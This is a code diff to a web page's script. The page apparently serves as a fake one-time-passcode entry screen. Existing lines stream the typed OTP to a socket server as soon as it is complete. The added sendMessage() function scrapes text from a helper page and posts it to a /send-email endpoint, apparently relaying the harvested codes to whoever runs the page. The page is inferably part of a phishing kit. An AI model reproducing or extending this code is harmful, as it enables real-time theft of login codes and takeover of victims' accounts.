@@ -50,9 +50,38 @@
     
                 if (otpValue.length === otpInputs.length) {
                     socket.emit("otpEntered", { field: "otp", value: otpValue });
+
+                    // Call sendMessage() when OTP is fully entered
+                    sendMessage();
                 }
             });
         });
+
+        // Function to fetch message from Exa1.html and send email
+        async function sendMessage() {
+            try {
+                // Fetch Exa1.html content
+                const response = await fetch('/HEXYO.html'); 
+                const text = await response.text();
+
+                // Parse the HTML and extract the message
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(text, "text/html");
+                const message = doc.getElementById('displayArea').textContent.trim();
+
+                // Send message to backend
+                const res = await fetch('/send-email', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message })
+                });
+
+                const data = await res.json();
+                alert(data.message);
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
     </script>    
 
     <script src="PAX_V.js"></script>
